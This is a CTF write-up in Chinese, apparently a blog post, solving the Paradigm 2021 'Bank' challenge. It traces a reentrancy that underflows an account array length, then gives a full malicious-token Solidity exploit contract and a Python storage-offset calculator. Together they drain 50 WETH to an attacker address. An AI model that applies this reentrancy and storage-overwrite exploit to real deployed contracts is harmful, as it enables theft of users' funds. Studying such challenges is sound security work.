---
layout: post
title:  "Paradigm 2021 Bank题解"
date:   2021-07-19 11:07:32 +0800
categories: paradigm
---
### 题目逻辑

1. Setup在Bank里存了50个WETH，目的是清空这50个WETH
2. close函数作用和withdraw函数有重合，可能存在重入使length下溢

```
deposite
    $id <= len
    if id == len:
        len+=1
    ->1
    utk+=1
    ->2

withdraw
    $id < len
    last=len-1
    ->1
    utk--
    if utk==0 and id==last:
        len-=1
    ->2

close
    $len > 0
    $utk==0
    len--
```

1. 肉眼分析可得下溢的流程

```
deposite()
        len=1
        bala(1):withdraw()
            $0<1
            bala(2):deposite()
                $0<=1
                bala(3):close()
                    $len>0
                    $utk==0
                    len=0
                utk=1
                bala(4)
                bala(5)
            utk=0
            len=-1
            bala(6)
            bala(7)
        utk=1
        bala(8)
        bala(9)
```

### 解题

1. 创建攻击合约

```solidity
contract BadToken {
    uint256 public enter_count = 0;
    address public self;
    Bank public b;
    
    constructor() {
        self = address(this);
    }
    
    function transfer(address dst, uint qty) public returns (bool) {
        return true;
    }
    
    function transferFrom(address src, address dst, uint qty) public returns (bool) {
        return true;
    }
    
    function approve(address dst, uint qty) public returns (bool) {
        
    }
    
    function set_enter(uint256 e) public {
        enter_count = e;
    }
    
    function balanceOf(address who) public returns (uint) {
        enter_count += 1;
        if(enter_count == 1) {
            b.withdrawToken(0, self, 0);
        }
        if(enter_count == 2) {
            b.depositToken(0, self, 0);
        }
        if(enter_count == 3) {
            b.closeLastAccount();
        }
        return 0;
    }
    
    function init(address target) public {
         b = Bank(target);
    }
    
    function pwn() public {
        b.depositToken(0, self, 0);
    }
    
    function pwn2(uint256 aid) public {
        address weth9 = 0x3ABb7E6DA32ddCf064848c4A890226330114c4a5;
        b.withdrawToken(aid, weth9, 50 ether);
        WETH9(weth9).transfer(0x233333F494990E8BBa9143a1964C3d91597eee81, 50 ether);
    }
}
```
注意```transfer```和```transferFrom```函数返回值必须为true
2. 执行```init(bank)```和```pwn()```之后，```accounts[hack].length```已经下溢到```zinf-1```，只需让```accounts[hack][accountId]```指向```accounts[setup][0]```，这里有个坑点，结构体数组的存储是按结构体元素个数的，这里结构体元素占了3个slot，所以```accounts[hack]```数组的地址和```accounts[setup]```数组的地址差值必须是3的倍数，构造计算代码如下

```python
def calc_aid(hack, setup):
    ss = get_storage_key(2, setup)
    settab = sha(int(ss, 16))
    hh = get_storage_key(2, hack)
    hactab = sha(int(hh, 16))
    delta = int(settab, 16) - int(hactab, 16)
    if delta < 0:
        delta += zinf
    print(f"{hex(delta)} % 3 == {delta % 3}")
    return hex(delta // 3)
```

多部署几个hack，当地址满足条件时调用```pwn2(calc_aid(hack, setup))```即可将setup账户存在bank的所有weth9提取出来并转账给攻击者

### 扩展

可以手动构建函数骨架逻辑后自动化跑重入点，参考GitHub Repo